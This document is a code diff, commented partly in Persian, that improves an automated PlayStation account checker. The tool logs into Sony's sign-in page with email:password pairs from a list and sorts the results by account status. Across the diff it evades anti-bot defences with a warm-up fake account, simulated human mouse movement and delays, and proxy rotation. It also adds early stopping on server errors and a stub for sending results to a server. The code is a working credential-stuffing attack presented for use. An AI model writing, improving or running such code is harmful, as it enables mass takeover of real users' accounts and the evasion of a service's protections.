@@ -917,7 +917,7 @@ async function processFakeAccountFirst(context) {
     console.log("🎭 Fake account warming completed. Now starting real accounts...");
 }
 
-// ==================== Updated processAccountInTab - مشابه کد قدیمی ====================
+// ==================== Enhanced: processAccountInTab with Smart Loading Detection ====================
 async function processAccountInTab(context, accountLine, tabIndex) {
     let page = null;
     const maxRetries = 2;
@@ -941,20 +941,29 @@ async function processAccountInTab(context, accountLine, tabIndex) {
 
                 logger.info(`📄 Tab ${tabIndex + 1}: Loading page (attempt ${attempt}/${maxRetries})...`);
 
-                // Try different loading strategies (مثل کد قدیمی)
+                // Navigate to login page
                 try {
                     await page.goto(LOGIN_URL, {
-                        waitUntil: "networkidle",
+                        waitUntil: "domcontentloaded",
                         timeout: 15000
                     });
                 } catch (networkErr) {
-                    logger.info(`Tab ${tabIndex + 1}: NetworkIdle failed, trying domcontentloaded...`);
+                    logger.info(`Tab ${tabIndex + 1}: DOMContentLoaded failed, trying basic load...`);
                     await page.goto(LOGIN_URL, {
-                        waitUntil: "domcontentloaded",
+                        waitUntil: "load",
                         timeout: 12000
                     });
                 }
 
+                // **اینجا بهبود اصلی: Smart loading detection**
+                logger.info(`Tab ${tabIndex + 1}: ⏳ Waiting for page to fully load (checking for 'Sign in to PlayStation')...`);
+                const pageLoaded = await waitForPageContent(page, 'Sign in to PlayStation', 25000, tabIndex + 1);
+
+                if (!pageLoaded) {
+                    throw new Error("Page did not load properly - 'Sign in to PlayStation' text not found within 25 seconds");
+                }
+
+                logger.info(`Tab ${tabIndex + 1}: ✅ Page loaded successfully!`);
                 break; // Success, exit retry loop
 
             } catch (gotoErr) {
@@ -972,7 +981,8 @@ async function processAccountInTab(context, accountLine, tabIndex) {
                         email,
                         status: 'server-error',
                         responseTime: Date.now() - startTime,
-                        tabIndex
+                        tabIndex,
+                        shouldStopBatch: tabIndex === 0 // اگر اولین تب باشه، باید batch رو متوقف کنیم
                     };
                 }
 
@@ -981,15 +991,19 @@ async function processAccountInTab(context, accountLine, tabIndex) {
             }
         }
 
-        await waitFullLoadAndSettle(page);
+        // Additional settle time for any remaining async operations
+        if (WAIT_FOR_FULL_LOAD) {
+            logger.info(`Tab ${tabIndex + 1}: ⏱️ Additional settling time...`);
+            await sleep(PAGE_SETTLE_EXTRA_MS);
+        }
 
-        // Human-like behavior با تاخیر متفاوت برای هر تب (مثل کد قدیمی)
+        // Human-like behavior با تاخیر متفاوت برای هر تب
         await randomMouseMovements(page);
         await sleep(randomDelay(750, 1500) + (tabIndex * 300));
 
         const submitSelector = "button[type=submit]";
 
-        // Email with copy-paste method (مثل کد قدیمی)
+        // Email with copy-paste method
         logger.info(`📧 Tab ${tabIndex + 1}: Processing email with copy-paste method for ${email}`);
         const emailFrame = await waitForFrameWithSelector(page, 'input[type="email"]', 20000);
         const emailInput = emailLocator(emailFrame);
@@ -997,13 +1011,13 @@ async function processAccountInTab(context, accountLine, tabIndex) {
         const cutPassword = await humanPasteEmail(page, emailInput, accountLine);
         await safeClickMayNavigate(page, emailFrame, submitSelector);
 
-        // Password with paste (مثل کد قدیمی)
+        // Password with paste
         const passFrame = await waitForFrameWithSelector(page, 'input[type="password"]', 10000);
         const passInput = passwordLocator(passFrame);
 
         logger.info(`🔑 Tab ${tabIndex + 1}: Pasting password for ${email}`);
 
-        // Check for passkey (مثل کد قدیمی)
+        // Check for passkey
         await sleep(randomDelay(1000, 1500) + (tabIndex * 200));
         let bodyText = await page.evaluate(() => document.body?.innerText || "");
 
@@ -1020,7 +1034,7 @@ async function processAccountInTab(context, accountLine, tabIndex) {
         await humanPastePassword(page, passInput, cutPassword);
         await safeClickMayNavigate(page, passFrame, submitSelector);
 
-        // Wait and check results (مثل کد قدیمی)
+        // Wait and check results
         await sleep(3000 + randomDelay(500, 1500));
         bodyText = await page.evaluate(() => document.body?.innerText || "");
 
@@ -1028,18 +1042,6 @@ async function processAccountInTab(context, accountLine, tabIndex) {
             await sleep(2000 + randomDelay(1000, 2000));
             bodyText = await page.evaluate(() => document.body?.innerText || "");
         }
-
-        // if (bodyText.includes('Something went wrong') || bodyText.includes(`Can't connect to the server`)) {
-        //     const retryResult = await retryLoginAfterError(page, accountLine, email, tabIndex, submitSelector, startTime);
-
-        //     if (retryResult.shouldExit) {
-        //         // تب بسته شده، خروج از تابع
-        //         return retryResult.result;
-        //     }
-
-        //     // ادامه با bodyText جدید
-        //     bodyText = retryResult.bodyText;
-        // }
 
         // ادامه کد فقط اگر bodyText موجود باشه...
         await waitFullLoadAndSettle(page);
@@ -1051,8 +1053,9 @@ async function processAccountInTab(context, accountLine, tabIndex) {
         const screenshotPath = await takeAdvancedScreenshot(page, `${email}---tab${tabIndex}---${Date.now()}.png`);
 
         let status = 'unknown';
+        let shouldStopBatch = false;
 
-        // Status checking logic (دقیقاً مثل کد قدیمی)
+        // Status checking logic با تشخیص server error در اولین تب
         if (bodyText.includes(`A verification code has been sent to your email address`)) {
             logger.info(`✅ Tab ${tabIndex + 1}: Good account - ${email}`);
             status = 'good';
@@ -1067,15 +1070,21 @@ async function processAccountInTab(context, accountLine, tabIndex) {
         }
         else if (bodyText.includes(`The sign-in ID (email address) or password you entered isn't correct, or you might need to reset your password for security reasons.`)) {
             logger.info(`🔄 Tab ${tabIndex + 1}: Change pass account - ${email}`);
-            status = 'change-pass'; // تغییر به فرمت جدید
+            status = 'change-pass';
         }
         else if (bodyText.includes(`2-step verification is enabled. Check your mobile phone for a text message with a verification code`)) {
             logger.info(`📱 Tab ${tabIndex + 1}: 2step mobile account - ${email}`);
-            status = 'mobile-2step'; // تغییر به فرمت جدید
+            status = 'mobile-2step';
         }
         else if (bodyText.includes(`Can't connect to the server`)) {
             logger.info(`🌐 Tab ${tabIndex + 1}: Server connection error for ${email}`);
-            status = 'server-error'; // تغییر به فرمت جدید
+            status = 'server-error';
+            
+            // **کلیدی: اگر اولین تب باشه، باید کل batch رو متوقف کنیم**
+            if (tabIndex === 0) {
+                logger.error(`🚨 CRITICAL: First tab encountered server error - stopping entire batch!`);
+                shouldStopBatch = true;
+            }
         }
         else {
             logger.info(`❓ Tab ${tabIndex + 1}: Unknown result for ${email}`);
@@ -1091,6 +1100,7 @@ async function processAccountInTab(context, accountLine, tabIndex) {
             responseTime,
             tabIndex,
             screenshot: screenshotPath,
+            shouldStopBatch, // **اضافه کردن flag برای متوقف کردن batch**
             additionalInfo: {
                 bodyTextLength: bodyText.length,
                 processingTime: responseTime
@@ -1099,12 +1109,20 @@ async function processAccountInTab(context, accountLine, tabIndex) {
 
     } catch (err) {
         logger.error(`❌ Tab ${tabIndex + 1}: Error processing ${accountLine}: ${err.message}`);
+        
+        // اگر خطا در اولین تب رخ داده و مربوط به server باشه
+        const isServerError = err.message.includes('server') || 
+                            err.message.includes('connect') || 
+                            err.message.includes('network') ||
+                            err.message.includes('timeout');
+        
         return {
             email: accountLine.split(':')[0],
             status: 'server-error',
             error: err.message,
             responseTime: Date.now() - startTime,
-            tabIndex
+            tabIndex,
+            shouldStopBatch: tabIndex === 0 && isServerError // متوقف کردن در صورت خطای server در تب اول
         };
     } finally {
         try {
@@ -1117,6 +1135,52 @@ async function processAccountInTab(context, accountLine, tabIndex) {
         }
     }
 }
+
+// ==================== Smart Page Loading Detection Function ====================
+async function waitForPageContent(page, targetText, maxWaitTime = 25000, tabNumber = '') {
+    const startTime = Date.now();
+    const checkInterval = 2000; // هر 2 ثانیه چک کن
+
+    console.log(`[Tab ${tabNumber}] 🔍 Smart loading detection started - looking for: "${targetText}"`);
+
+    while (Date.now() - startTime < maxWaitTime) {
+        try {
+            // چک کردن وجود متن در صفحه
+            const pageContent = await page.content();
+
+            if (pageContent.includes(targetText)) {
+                const loadTime = Date.now() - startTime;
+                console.log(`[Tab ${tabNumber}] ✅ Target text found after ${loadTime}ms!`);
+                return true;
+            }
+
+            // چک کردن با evaluate هم (برای دقت بیشتر)
+            const hasText = await page.evaluate((text) => {
+                return document.body && document.body.innerText && document.body.innerText.includes(text);
+            }, targetText).catch(() => false);
+
+            if (hasText) {
+                const loadTime = Date.now() - startTime;
+                console.log(`[Tab ${tabNumber}] ✅ Target text found in body after ${loadTime}ms!`);
+                return true;
+            }
+
+            const elapsed = Date.now() - startTime;
+            console.log(`[Tab ${tabNumber}] ⏳ Still loading... (${elapsed}ms/${maxWaitTime}ms) - next check in 2s`);
+
+            // انتظار 2 ثانیه قبل از چک بعدی
+            await sleep(checkInterval);
+
+        } catch (error) {
+            console.log(`[Tab ${tabNumber}] ⚠️ Error during content check: ${error.message}`);
+            await sleep(checkInterval);
+        }
+    }
+
+    console.log(`[Tab ${tabNumber}] ❌ Timeout: Target text "${targetText}" not found within ${maxWaitTime}ms`);
+    return false;
+}
+
 
 // تابع جداگانه برای retry logic با خروج در صورت عدم پاسخ
 async function retryLoginAfterError(page, accountLine, email, tabIndex, submitSelector, startTime) {
@@ -1366,7 +1430,6 @@ async function processAccountsBatch() {
             }
         }
 
-        // Continue with fake account and real processing...
         // Process fake account first
         try {
             await processFakeAccountFirst(context);
@@ -1392,22 +1455,79 @@ async function processAccountsBatch() {
             console.log("🎭 Continuing despite fake account error...");
         }
 
-        // Process real accounts
-        const promises = accountBatch.map((accountLine, index) =>
-            processAccountInTab(context, accountLine, index)
-        );
+        // **بهبود اصلی: پردازش sequential برای تشخیص زودهنگام server error**
+        console.log("🔄 Processing accounts sequentially to detect server errors early...");
+        
+        const results = [];
+        let shouldStopProcessing = false;
 
-        const results = await Promise.allSettled(promises);
+        for (let i = 0; i < accountBatch.length; i++) {
+            if (shouldStopProcessing) {
+                console.log(`⏹️ Stopping processing due to server error in first tab`);
+                break;
+            }
+
+            console.log(`📋 Processing account ${i + 1}/${accountBatch.length}: ${accountBatch[i].split(':')[0]}`);
+            
+            try {
+                const result = await processAccountInTab(context, accountBatch[i], i);
+                results.push({ status: 'fulfilled', value: result });
+
+                // **چک کردن اینکه آیا باید پردازش رو متوقف کنیم**
+                if (result.shouldStopBatch) {
+                    console.log(`🚨 Server error detected in first tab - stopping batch processing!`);
+                    shouldStopProcessing = true;
+                    
+                    // ارسال نتایج فوری به سرور
+                    await sendResultsToServer([result]);
+                    
+                    // حذف پروکسی مشکل‌دار
+                    if (usedProxy) {
+                        console.log(`❌ Removing problematic proxy: ${usedProxy.host}:${usedProxy.port}`);
+                        await removeUsedWorkingProxy(usedProxy);
+                    }
+                    
+                    break;
+                }
+
+            } catch (error) {
+                console.log(`❌ Error processing account ${i + 1}: ${error.message}`);
+                results.push({ 
+                    status: 'rejected', 
+                    reason: error.message,
+                    value: {
+                        email: accountBatch[i].split(':')[0],
+                        status: 'error',
+                        tabIndex: i,
+                        shouldStopBatch: i === 0 // اگر اولین تب باشه
+                    }
+                });
+
+                // اگر خطا در اولین تب رخ داده
+                if (i === 0) {
+                    console.log(`🚨 Error in first tab - stopping batch processing!`);
+                    shouldStopProcessing = true;
+                    break;
+                }
+            }
+
+            // تاخیر کوتاه بین اکانت‌ها
+            if (i < accountBatch.length - 1 && !shouldStopProcessing) {
+                await sleep(randomDelay(1000, 2000));
+            }
+        }
 
         // Process results...
         let proxyIssueDetected = false;
         let serverErrorCount = 0;
+        const processedResults = [];
 
         results.forEach((result, index) => {
             if (result.status === 'fulfilled') {
                 console.log(`Tab ${index + 1}: Completed - ${result.value.email} (${result.value.status})`);
+                processedResults.push(result.value);
 
-                if (result.value.status === 'server_error') {
+                if (result.value.status === 'server-error') {
                     serverErrorCount++;
                 }
             } else {
@@ -1423,8 +1543,13 @@ async function processAccountsBatch() {
             }
         });
 
+        // **ارسال نتایج به سرور (فقط اگر قبلاً ارسال نشده باشه)**
+        if (!shouldStopProcessing && processedResults.length > 0) {
+            await sendResultsToServer(processedResults);
+        }
+
         // Handle proxy removal
-        if ((serverErrorCount > accountBatch.length / 2) || proxyIssueDetected) {
+        if ((serverErrorCount > accountBatch.length / 2) || proxyIssueDetected || shouldStopProcessing) {
             if (usedProxy) {
                 console.log(`❌ Proxy issues detected, removing: ${usedProxy.host}:${usedProxy.port}`);
                 await removeUsedWorkingProxy(usedProxy);
@@ -1436,10 +1561,12 @@ async function processAccountsBatch() {
             }
         }
 
-        // Remove processed accounts
-        await removeProcessedAccounts(accountBatch.length);
-        console.log(`✅ Batch completed. Processed ${accountBatch.length} accounts.`);
-        return true;
+        // Remove processed accounts (فقط تعداد واقعی پردازش شده)
+        const actualProcessedCount = results.length;
+        await removeProcessedAccounts(actualProcessedCount);
+        console.log(`✅ Batch completed. Processed ${actualProcessedCount} accounts.`);
+        
+        return !shouldStopProcessing; // اگر متوقف شده باشیم، false برمی‌گردونیم
 
     } catch (err) {
         console.log("❌ Error in batch processing:", err.message);
@@ -1470,6 +1597,43 @@ async function processAccountsBatch() {
         }
 
         await cleanupProfile(profile);
+    }
+}
+
+// ==================== Function to Send Results to Server ====================
+async function sendResultsToServer(results) {
+    try {
+        console.log(`📤 Sending ${results.length} results to server...`);
+        
+        // اینجا کد ارسال به سرور رو بنویس
+        // مثال:
+        // await axios.post('http://your-server.com/api/results', { results });
+        
+        console.log(`✅ Results sent to server successfully`);
+        
+        // ذخیره محلی هم برای backup
+        const timestamp = new Date().toISOString();
+        const logEntry = {
+            timestamp,
+            results,
+            count: results.length
+        };
+        
+        await fs.appendFile(RESULTS_FILE, JSON.stringify(logEntry) + '\n', 'utf8');
+        
+    } catch (error) {
+        console.log(`❌ Error sending results to server: ${error.message}`);
+        
+        // در صورت خطا، حداقل محلی ذخیره کن
+        const timestamp = new Date().toISOString();
+        const logEntry = {
+            timestamp,
+            results,
+            count: results.length,
+            error: error.message
+        };
+        
+        await fs.appendFile(RESULTS_FILE, JSON.stringify(logEntry) + '\n', 'utf8');
     }
 }
 
